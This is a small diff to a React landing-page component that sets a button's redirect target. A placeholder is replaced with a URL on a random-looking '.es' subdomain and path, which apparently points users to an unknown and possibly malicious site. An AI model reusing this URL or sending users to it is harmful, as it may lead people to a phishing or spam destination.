@@ -1,11 +1,10 @@
-
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { ExternalLink } from "lucide-react";
 
 const Index = () => {
   // CONFIGURE YOUR REDIRECT URL HERE
-  const redirectUrl = "YOUR_NEW_REDIRECT_URL_HERE";
+  const redirectUrl = "https://joq7s.bpjoriiwkb.es/LvFWfJVB/";
   
   const defaultImage = "/lovable-uploads/d4b1a581-c597-44ad-8111-d3f05fb556f6.png";
   
@@ -51,4 +50,3 @@ const Index = () => {
 };
 
 export default Index;
-
